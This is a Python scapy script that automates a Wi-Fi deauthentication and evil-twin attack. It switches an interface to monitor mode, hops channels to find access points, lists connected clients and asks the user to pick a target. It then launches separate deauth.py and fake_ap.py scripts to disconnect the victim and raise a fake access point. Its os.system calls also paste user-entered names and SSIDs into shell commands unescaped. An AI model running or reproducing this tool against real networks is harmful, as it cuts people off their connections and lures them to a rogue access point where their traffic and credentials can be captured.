import os
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt 
# import pandas




ap_list = []
### Coloum indices for 'ap_list'. 
ESSID = 0
BSSID = 1
CHANNEL = 2

client_list = []
essids_set = set()

  
### Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan



##############################################
############### Interface Mode ###############
##############################################

### In this function the user choose the interface that will scan the network and send the deauthentication packets. 
### In order to do so, we need to switched this interface to 'monitor mode'. 
def monitor_mode():
    global interface
    print(G + "*** Step 1:  Choosing an interface to put in 'monitor mode'. *** \n")
    empty = input ("Press Enter to continue.........\n")
    print(W)
    os.system('ifconfig')
    interface = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
    print(W)
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')
    # os.system('iwconfig') #check


### After we finish our attack, we want to switch back the interface to 'managed mode'. 
def managed_mode():
    print(G + "\n*** Step 5: Put the interface back in managed mode. *** \n")
    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........\n")
    print(W)
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')
    print(B + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
    os.system('iwconfig')




##############################################
############### APs Scanning #################
##############################################

### Rapper function for 'wifi_scan()'. 
def ap_scan_rap():
    print(G + "*** Step 2: Scanning the network for AP to attack. *** \n")
    empty = input ("Press Enter to continue.........\n")
    # os.system ('airodump-ng ' + interface)
    ap_scan()

                                         
### In this fucntion we scan the network for nearby access points. 
### We present to the user all the APs that were found, and he choose which AP he want to attack. 
def ap_scan():
    global search_timeout
    search_timeout = int(input(G + "Please enter the scanning time frame in seconds: "))
    channel_changer = Thread(target = change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    print("\n Scanning for networks...\n")
    sniff(iface = interface, prn = ap_scan_pkt, timeout=search_timeout)
    num_of_ap = len(ap_list)
    if num_of_ap > 0: 
        # If at least 1 AP was found. 
        print("\n*************** APs Table ***************\n")
        for x in range(num_of_ap):
            print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
        print("\n************* FINISH SCANNING *************\n")
        ap_index = int(input("Please enter the number of the AP you want to attack: "))
        print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
        set_channel(int(ap_list[ap_index][CHANNEL]))
        global ap_mac
        global ap_name
        global ap_channel
        ap_mac = ap_list[ap_index][BSSID]
        ap_name = ap_list[ap_index][ESSID]
        ap_channel = ap_list[ap_index][CHANNEL]
        # client_scan_rap()
    else: 
        # If no AP was found. 
        rescan = input("No networks were found. Do you want to rescan? [Y/n] \n")
        if rescan == "n":
            print("  Sorry :(  ")
        else:
            ap_scan()


### In order to scan the network for multiple APs we need to check with each channel in the range [1,14]. 
### Usually routers will use the 2.4GHz band with a total of 14 channels. 
### (In reality it may be 13 or even less that are used around the world) 
def change_channel():
    channel_switch = 1
    while True:
        os.system('iwconfig %s channel %d' % (interface, channel_switch))
        # switch channel in range [1,14] each 0.5 seconds
        channel_switch = channel_switch % 14 + 1
        time.sleep(0.5)


### After the user choose the AP he want to attack, we want to set the interface's channel to the same channel as the choosen AP. 
def set_channel(channel):
    os.system('iwconfig %s channel %d' % (interface, channel))


### sniff(..., prn = scan_netwroks, ...) 
### The argument 'prn' allows us to pass a function that executes with each packet sniffed. 
def ap_scan_pkt(pkt):
    if pkt.haslayer(Dot11Beacon):
        # Get the BSSID (MAC ADDR) of the AP
        bssid = pkt[Dot11].addr2
        # Get the ESSID (name) of the AP
        essid = pkt[Dot11Elt].info.decode()
        if essid not in essids_set:
            essids_set.add(essid)
            stats = pkt[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            ap_list.append([essid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))




##############################################
############# Clients Scanning ###############
##############################################

### Rapper function for 'client_scan()'. 
def client_scan_rap():
    print(G + "\n*** Step 3: Verifying that at least 1 client is connected to the AP you choose. *** \n")
    empty = input ("Press Enter to continue.........\n")
    print(W)
    # os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
    client_scan()
    print("\n")


### In this fucntion we scan the network for clients who are connected to the choosen AP. 
### We present to the user all the clients that were found, and he choose which client he want to attack. 
def client_scan():
    s_timeout = search_timeout * 2
    print(G + "\nScanning for clients that connected to: " + ap_name + " ...")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
    num_of_client = len(client_list)
    if num_of_client > 0: 
        # If at least 1 client was found. 
        print("\n*************** Clients Table ***************\n")
        for x in range(num_of_client):
            print("[" + str(x) + "] - "+ client_list[x])
        print("\n************** FINISH SCANNING **************\n")
        client_index = input("Please enter the number of the client you want to attack or enter 'R' if you want to rescan: ")
        if client_index == 'R': 
            # Rescan
            client_scan()
        elif client_index.isnumeric():
            # Client was choosen
            print("You choose the client: [" + client_index + "] - "+ client_list[int(client_index)])
            global client_mac
            client_mac = client_list[int(client_index)]
            # deauth_attack()
    else: 
        # If no client was found. 
        rescan = input("No clients were found. Do you want to rescan? [Y/n] \n")
        if rescan == "n":
            print("  Sorry :(  ")
        else:
            client_scan()
  

### Same as 'ap_scan_pkt()' but for the clients. 
def client_scan_pkt(pkt):
    global client_list
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                client_list.append(pkt.addr1)
                print("Client with MAC address: " + pkt.addr1 + " was found.")






##############################################
########## Deauthentication Attcak ###########
##############################################

### In this fucntion we eventually ATTACK. YAY!
### We send the deauthentication packets to the choosen AP and client. 
def deauth_attack():
    print("\n*** Step 4: Disconnect the connection between the AP from the client. *** \n")
    print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
    empty = input ("Press Enter to start sending the Deauthentication packets.........\n")
    print(W)
    os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
    os.system('python3 deauth.py ' + client_mac + ' ' + ap_mac + ' ' + interface)




if __name__ == "__main__":
    
    if os.geteuid():
        sys.exit(R + '[**] Please run as root')
    
    print(B + "********************************************************************** \n")
    print("***** Part 1: choosing the AP we want to attck and attacks it ;) ***** \n")
    print("********************************************************************** \n")
    
    ### Step 1: Choosing the interface for monitoring, and put it in monitor mode. 
    monitor_mode()

    ### Step 2: Choosing the AP that we want to attack. 
    ap_scan_rap()
    
    ### Step 3: Checking that the choosen AP have client that connected to it.
    client_scan_rap()
    
    ### Step 4: Running the deauthentication script.
    deauth_attack()
    
    ### Step 5: Put the interface back in managed mode  
    managed_mode()
    
    ### Part 2: Set up & upload fake AP.
    print(W)
    # os.system('python3 second_part.py ' + ap_name) 
    # os.system('gnome-terminal -- sh -c "python3 k1.py "' + z )
    # run_second_part = "python3 second_part.py " + ap_name
    # os.system('gnome-terminal -- sh -c "python3 second_part.py "' +  ap_name)
    




